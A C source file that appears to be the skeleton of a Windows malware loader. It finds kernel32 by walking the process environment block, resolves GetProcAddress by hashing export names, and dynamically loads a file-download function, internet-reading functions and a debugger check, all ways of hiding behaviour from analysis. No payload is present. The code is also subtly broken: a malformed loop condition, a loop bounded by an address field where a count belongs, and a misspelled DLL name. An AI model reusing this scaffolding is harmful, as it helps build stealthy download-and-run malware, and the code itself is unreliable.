#include <windows.h>
#include <winternl.h>
#include <wininet.h>
typedef uintptr_t uword;

#define ALWAYS_INLINE inline __attribute__((always_inline))
#define NEVER_INLINE __attribute__((noinline))

#ifdef FREESTANDING
#define CRASH() __asm__("ud2")
#else
#define CRASH() EXIT(1)
#endif

#define EXIT(code) _Exit(code)

#define DIE(...)                                                               \
  do {                                                                         \
    DEBUG(__VA_ARGS__);                                                        \
    CRASH();                                                                   \
  } while (0)

#define CHECK(cond, msg)                                                       \
  if (!(cond)) {                                                               \
    DIE("Error: check %s failed: %s\n", #cond, msg);                           \
  }

#ifdef FREESTANDING
#define DEBUG(...)
#else
#include <stdio.h>
#define DEBUG(...) fprintf(stderr, __VA_ARGS__)
#endif

// LoadLibraryA must be first
#define FOR_EACH_DEP(V)                                                        \
  V(kernel32, LoadLibraryA)                                                    \
  V(urlmon, URLDownloadToFileA)                                                \
  V(winnet, InternetCloseHandle)                                               \
  V(winnet, InternetReadFile)                                                  \
  V(kernel32, IsDebuggerPresent)                                               \
  



#define DECLARE(_dll, f) __typeof__(f) *my##f = NULL;

#define LOAD_DLL(dll) h##dll = myLoadLibraryA(#dll ".dll");

#define LOAD_FUNC(dll, name)                                                   \
  if (!h##dll) {                                                               \
    LOAD_DLL(dll)                                                              \
  }                                                                            \
  my##name = (__typeof__(name) *)myGetProcAddress(h##dll, #name);

HMODULE hkernel32 = NULL;
HMODULE hurlmon = NULL;
HMODULE hwinnet = NULL;
__typeof__(GetProcAddress) *myGetProcAddress = NULL;
FOR_EACH_DEP(DECLARE)

static ALWAYS_INLINE HMODULE FindKernel32() {
  PPEB pebPtr = NtCurrentTeb()->ProcessEnvironmentBlock;
  PPEB_LDR_DATA ldr = pebPtr->Ldr;
  PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
  PLIST_ENTRY kernel_exe = head->Flink;
  PLIST_ENTRY ntdll_dll = kernel_exe->Flink;
  PLIST_ENTRY kernel32_dll = ntdll_dll->Flink;
  return CONTAINING_RECORD(kernel32_dll, LDR_DATA_TABLE_ENTRY,
                           InMemoryOrderLinks)
      ->DllBase;
}

static ALWAYS_INLINE DWORD hashOf(const char *data) {
  // https://cocomelonc.github.io/tutorial/2022/04/02/malware-injection-18.html
  DWORD hash = 0x35;
  for (int i = 0; i < data[i] != '\0'; i++) {
    hash += data[i] + (hash << 1);
  }
  return hash;
}

static ALWAYS_INLINE LPVOID FindFuncInModule(HMODULE h, DWORD myHash) {
  // https://cocomelonc.github.io/tutorial/2022/04/02/malware-injection-18.html
  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
  CHECK(img_dos_header->e_magic == 0x5A4D, "bad dos header magic");
  PIMAGE_NT_HEADERS img_nt_header =
      (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
  CHECK(img_nt_header->Signature == 0x4550, "bad header signature");
  PIMAGE_EXPORT_DIRECTORY img_edt =
      (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)h +
                                img_nt_header->OptionalHeader
                                    .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                                    .VirtualAddress);
  PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
  PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
  PWORD fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);
  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
    if (hashOf(pFuncName) == myHash) {
      LPVOID result = (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
      DEBUG("Found function %s=0x%p (hash 0x%p)\n", pFuncName, result, myHash);
      return result;
    }
  }
  DIE("[!] Failed to find GetProcAddress\n");
}

#ifdef FREESTANDING
int WINAPI mainCRTStartup(void) {
#else
int WINAPI main(void) {
#endif
  hkernel32 = FindKernel32();
  const uword hash_GetProcAddress = 0x000000001ac1e8e1;
  myGetProcAddress = FindFuncInModule(hkernel32, hash_GetProcAddress);
  FOR_EACH_DEP(LOAD_FUNC)
  return 0;
}
